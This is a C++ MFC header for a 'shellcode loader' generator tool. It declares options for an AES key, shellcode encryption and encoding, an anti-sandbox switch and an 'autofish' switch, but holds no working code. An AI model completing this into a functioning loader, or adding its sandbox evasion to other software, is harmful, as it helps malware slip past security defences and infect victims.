
// shellcodeLoaderDlg.h : 头文件
//

#pragma once
#include "afxwin.h"
#include <random>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>

// CshellcodeLoaderDlg 对话框
class CshellcodeLoaderDlg : public CDialogEx
{
// 构造
public:
	CshellcodeLoaderDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SHELLCODELOADER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CString ShellcodePath;
	CString AESKey;
	afx_msg void OnDropFiles(HDROP hDropInfo);
	BOOL bool_x64;
	BOOL bool_autofish;
	BOOL bool_antisandbox;
	CComboBox Method;
	std::string hex_encode(const std::vector<unsigned char>& input);
	std::string base64Encode(const std::string& input);
	void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength);
	afx_msg void OnBnClickedGenerate();
	afx_msg void OnBnClickedX64();
};


struct CONFIG
{
	BOOL antisandbox;
	BOOL autofish;
	unsigned char key[128];
};
